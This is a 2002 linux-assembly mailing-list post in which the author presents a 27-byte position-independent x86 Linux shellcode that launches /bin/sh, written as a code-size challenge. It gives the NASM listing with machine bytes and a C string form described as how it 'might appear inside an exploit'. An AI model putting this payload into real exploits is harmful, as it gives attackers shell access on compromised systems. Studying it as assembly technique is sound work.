From: Brian Raiter <breadbox@muppetlabs.com>
Subject: Re: shellcode
Date: Wed, 26 Jun 2002 11:00:04 -0700 (PDT)
Sender: linux-assembly-owner@vger.kernel.org
Message-ID: <15642.292.719679.393500@shub.muppetlabs.com>
References: <20020624001839.H342@nietzsche>
	<20020625212214.4910d000.stephan.walter@gmx.ch>
	<20020625144651.A430@nietzsche>
	<20020625222825.428828b3.stephan.walter@gmx.ch>
	<20020625161401.B27404@nietzsche>
	<20020626190858.41e57817.stephan.walter@gmx.ch>
Mime-Version: 1.0
Content-Transfer-Encoding: 7bit
Return-path: <linux-assembly-owner@vger.kernel.org>
In-Reply-To: <20020626190858.41e57817.stephan.walter@gmx.ch>
List-Id: <linux-assembly.vger.kernel.org>
Content-Type: text/plain; charset="us-ascii"
To: linux-assembly@vger.kernel.org

This thread has been about invoking a shell under BSD, which one would
imagine would be a bit off topic for the linux-assembly mailing list.
So, in order to remedy this ...

A few years ago a friend challenged me to come up with the smallest
possible code to invoke a shell under Linux. The only constraint he
placed was that the code had to be position-independent. Rummaging
through some old notes, I dug out the results of my efforts, which was
the following code (NASM syntax):

00000000 6A0B                   push    byte 11
00000002 E809000000             call    $ + 14
00000007 002F62696E2F736800     db      0, '/bin/sh', 0
00000010 5B                     pop     ebx
00000011 58                     pop     eax
00000012 99                     cdq
00000013 43                     inc     ebx
00000014 8D4BF8                 lea     ecx, [byte ebx - 8]
00000017 8919                   mov     [ecx], ebx
00000019 CD80                   int     0x80

Or, as it might appear inside an exploit:

    char sh[] = "j\v\350\t\0\0\0\0/bin/sh\0[X\231C\215K\370\211\031\315\200";
    (*(void(*)(void))sh)();

Note that the program needs to be in writeable memory; thus it needs
to be invoked from a variable and not a direct string literal.

(Unfortunately, it looks like my program is 27 bytes in size, leaving
it slightly longer than the BSD version.)

b
